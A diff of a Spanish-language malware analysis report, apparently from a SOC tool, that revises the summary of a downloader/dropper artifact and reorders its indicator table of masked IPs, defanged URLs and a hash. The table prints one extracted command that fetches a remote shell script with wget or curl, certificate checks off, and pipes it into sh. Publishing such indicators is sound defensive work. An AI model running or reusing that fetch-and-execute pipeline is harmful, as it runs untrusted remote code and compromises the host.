@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Ejecución. Se asoció 1 comando observado o extraído.
+Artefacto identificado como ASCII text, with CRLF line terminators de 799 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `sh` en `hxxps://217.60.195.XXX/sh`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+
 
 ## 🏷️ Clasificación
 
@@ -50,12 +51,12 @@ Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia dis
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
+| url | hxxps://217.60.195.XXX/sh) | strings |
+| url | hxxps://217.60.195.XXX/sh | strings |
 | ip | 190.179.167.XXX | static_analysis |
 | ip | 217.60.195.XXX | static_analysis |
-| url | hxxps://217.60.195.XXX/sh | strings |
-| url | hxxps://217.60.195.XXX/sh) | strings |
-| hash | 2772b3fffa2afede22c846b8224fddccd38a33bfde467b1cb758fc9229793444 | static_analysis |
 | command | (wget --no-check-certificate -qO- hxxps://217.60.195.XXX/sh \|\| curl -sk hxxps://217.60.195.XXX/sh) \| sh -s apache.selfre | strings |
+| hash | 2772b3fffa2afede22c846b8224fddccd38a33bfde467b1cb758fc9229793444 | static_analysis |
 | ip | 194.85.235.XXX | artifact_source |
 
 ## 🛡️ Nota de publicación
